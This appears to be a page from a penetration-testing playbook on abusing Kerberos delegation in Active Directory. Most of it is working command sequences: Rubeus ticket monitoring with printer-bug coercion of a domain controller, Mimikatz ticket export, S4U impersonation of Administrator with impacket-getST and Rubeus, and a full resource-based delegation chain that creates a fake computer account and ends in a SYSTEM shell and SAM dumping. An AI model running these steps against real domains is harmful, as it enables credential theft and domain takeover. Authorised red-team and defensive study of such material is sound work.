---
id: kerberos-delegation
title: Kerberos Delegation Abuse
stage: privesc
tags: [windows, ad, kerberos]
summary: Abuse Unconstrained, Constrained, or Resource-Based Constrained Delegation to impersonate privileged users — BloodHound shows all three types as delegation edges.
leads_to:
  - domain-admin
  - system-shell
  - pass-the-hash
---

## Prerequisites

Valid domain credentials. A machine or account with delegation configured — visible in BloodHound as `AllowedToDelegate` or `AllowedToActOnBehalfOf` edges. For unconstrained: admin access to the delegation machine. For RBCD: write access to `msDS-AllowedToActOnBehalfOfOtherIdentity` on the target computer.

Delegation allows a service to authenticate to other services on behalf of a user. Unconstrained delegation caches TGTs of any authenticating user, making it a TGT harvesting vector. Constrained delegation allows S4U2Proxy to request service tickets as any user. RBCD (Resource-Based Constrained Delegation) is the most commonly exploited — if you can write to a computer object, you can configure it to accept delegation from any account you control.

## Quick Win

> Find delegation configurations first — the type determines the attack path.

```bash
impacket-findDelegation domain.local/user:password -dc-ip $DC
```

## Find Delegation Configurations

> Enumerate all three types — unconstrained, constrained, and RBCD.

```bash
# From Linux
impacket-findDelegation domain.local/user:password -dc-ip $DC
```

```powershell
# From Windows / PowerView
Get-ADComputer -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation
Get-ADUser -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation
Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo
```

## Unconstrained Delegation

> Any account authenticating to the delegation machine leaves its TGT in memory — coerce a DC for DA TGT.

```powershell
# Monitor for incoming TGTs (run on the unconstrained delegation machine)
Rubeus.exe monitor /interval:5 /nowrap

# Coerce DC authentication to the machine
python3 printerbug.py domain.local/user:password@$DC $UNCONSTRAINED_MACHINE

# After DC TGT arrives in Rubeus output:
Rubeus.exe ptt /ticket:BASE64_TICKET

# Or extract all tickets with Mimikatz
.\mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" exit
```

## Constrained Delegation (S4U2Proxy)

> Account has msDS-AllowedToDelegateTo populated — get its hash, then request a service ticket impersonating Administrator.

```bash
# With Impacket (from Linux — needs service account hash)
impacket-getST -spn cifs/$TARGET.domain.local \
  -impersonate Administrator \
  domain.local/svc_account:password -dc-ip $DC

KRB5CCNAME=Administrator.ccache impacket-psexec -k -no-pass domain.local/Administrator@$TARGET
```

```powershell
# With Rubeus (from Windows)
Rubeus.exe s4u \
  /user:svc_account \
  /rc4:NTLM_HASH \
  /impersonateuser:Administrator \
  /msdsspn:"cifs/$TARGET" \
  /ptt
```

## Resource-Based Constrained Delegation (RBCD)

> Write to computer object's msDS-AllowedToActOnBehalfOfOtherIdentity → create fake computer → get DA-impersonating ticket.

```bash
# Step 1: Create a computer account you control
impacket-addcomputer domain.local/user:password -computer-name EVIL$ -computer-pass EvilPass123! -dc-ip $DC

# Step 2: Set RBCD — allow EVIL$ to delegate to the target
impacket-rbcd -action write -delegate-from 'EVIL$' -delegate-to '$TARGET_COMPUTER$' \
  domain.local/user:password -dc-ip $DC

# Step 3: Get a service ticket impersonating Administrator
impacket-getST -spn cifs/$TARGET.domain.local \
  -impersonate Administrator \
  domain.local/'EVIL$':EvilPass123! -dc-ip $DC

# Step 4: Use the ticket
KRB5CCNAME=Administrator.ccache impacket-psexec -k -no-pass domain.local/Administrator@$TARGET
```

## Leads To

Unconstrained delegation + DC TGT → PTT → access everything the DC can access → domain-admin. Constrained delegation S4U2Proxy → SYSTEM shell on the target service host. RBCD → impersonate Administrator on the target machine → SYSTEM shell → dump SAM for lateral movement.
